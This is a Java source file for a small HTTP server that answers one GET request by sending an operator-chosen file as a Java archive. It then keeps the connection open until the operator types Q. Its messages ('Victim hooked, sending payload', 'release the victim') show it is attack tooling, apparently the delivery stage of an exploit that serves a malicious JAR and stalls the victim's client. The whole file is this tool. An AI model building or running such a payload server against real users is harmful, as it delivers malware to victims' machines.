import java.net.*;
import java.io.*;
import java.util.*;

public class BlockingServer {
  int port;
  String path;
  Socket con;
  BufferedReader in;
  OutputStream out;
  PrintStream pout;

  public BlockingServer(int port, String path) {
    this.port = port;
    this.path = path;
  }

  public static void main(String[] args) {
    if (args.length!=2) {
      System.out.println("[+] Usage: java BlockingServer <port> <file to send>");
      System.exit(-1);
    }
    int port = Integer.parseInt(args[0]);
    String path = args[1];

    BlockingServer js = new BlockingServer(port, path);
    js.run();
  }

  public void run() {
    ServerSocket ss = null; 
    try {
      ss = new ServerSocket(port); 
    } catch (IOException e) {
      System.err.println("[+] Could not start server: "+e + ". Exiting");
      System.exit(-1);
    }

    while (true) {
      System.out.println("[+] BlockingServer accepting connections on port "+ port);
      try {
        con = ss.accept();
        in = new BufferedReader(new InputStreamReader(con.getInputStream()));
        out = new BufferedOutputStream(con.getOutputStream());
        pout = new PrintStream(out);
                
        String request = in.readLine();
        con.shutdownInput(); 

        processRequest(request);
        
        out.flush();
        System.out.println("[+] File sent, press Q and then ENTER to release the victim");
        BufferedReader in = new BufferedReader(new InputStreamReader(System.in));
        String msg ="";
        while (true) {
          try{
            msg=in.readLine();
          } catch(Exception e){}
          if(msg.equals("Q")) {
            break;
          } 
        }  
        
      } catch (Exception e) { 
        System.err.println(e); 
      }
      try {
        if (con!=null) con.close(); 
      } catch (IOException e) { 
        System.err.println(e); 
      }
    }
  }
  public void processRequest(String request) throws IOException {
    if (!request.startsWith("GET") || request.length()<14 || !(request.endsWith("HTTP/1.0") || request.endsWith("HTTP/1.1")) || request.charAt(4)!='/') {
      System.out.println("[+] Bad request. Exiting");
      System.exit(-1);
    } else {
      File f = new File(path);
      try { 
        System.out.println("[+] Victim hooked, sending payload");
        InputStream file = new FileInputStream(f);
        String contenttype = "application/java-archive";
        pout.print("HTTP/1.0 200 OK\r\n");
        if (contenttype!=null) pout.print("Content-Type: "+contenttype+"\r\n");
        pout.print("Date: "+new Date()+"\r\n"+ "Server: BlockingServer 1.0\r\n\r\n");
        byte[] buffer = new byte[1000];
        while (file.available()>0) out.write(buffer, 0, file.read(buffer));
      } catch (FileNotFoundException e) { 
        System.out.println("[+] Payload file cannot be found. Exiting");
        System.exit(-1);
      }
    }
  }



}


